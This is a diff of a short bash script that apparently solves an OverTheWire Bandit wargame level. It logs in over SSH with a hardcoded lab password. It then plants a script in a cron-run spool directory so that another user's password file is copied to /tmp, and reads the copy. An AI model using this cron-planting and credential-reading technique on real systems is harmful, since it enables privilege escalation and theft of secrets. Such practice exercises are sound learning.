@@ -1,2 +1,9 @@
 #!/usr/bin/env bash
-sshpass -p dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc ssh -p 2220 bandit23@bandit.labs.overthewire.org
+sshpass -p 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga ssh -p 2220 bandit23@bandit.labs.overthewire.org
+
+echo '#!/bin/bash' > /var/spool/bandit24/foo/myscript.sh
+echo 'cat etc/bandit_pass/bandit24 > /tmp/pass24' >> /var/spool/bandit24/foo/myscript.sh
+chmod 766 /var/spool/bandit24/foo/myscript.sh
+
+
+cat /tmp/pass24
